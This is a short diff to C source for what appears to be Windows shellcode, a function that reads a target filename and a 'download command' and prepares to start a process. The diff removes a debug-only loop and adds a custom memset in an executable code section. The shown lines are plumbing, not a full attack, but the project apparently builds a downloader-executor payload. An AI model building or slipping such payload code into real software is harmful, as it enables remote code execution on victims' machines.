@@ -24,14 +24,6 @@ __declspec(code_seg(".sc$000")) int shellcode(LPVOID arg) {
    char *filename = target_filename();
    char *command = download_command();
 
-#if defined(_DEBUG)
-   while (*filename == 0)
-      ++filename;
-
-   while (*command == 0)
-      ++command;
-#endif
-
    STARTUPINFOA startup_info;
    PROCESS_INFORMATION process_information;
 
@@ -201,4 +193,12 @@ __declspec(code_seg(".sc$c00a")) void memcpy_local(void *dest, const void *src, 
 
    for (size_t i=0; i<size; ++i)
       dest_u8[i] = src_u8[i];
+}
+
+#pragma section(".sc$c00b", read, execute)
+__declspec(code_seg(".sc$c00b")) void *memset(void *dest, uint8_t value, size_t size) {
+   for (size_t i=0; i<size; ++i)
+      ((uint8_t *)dest)[i] = value;
+
+   return dest;
 }
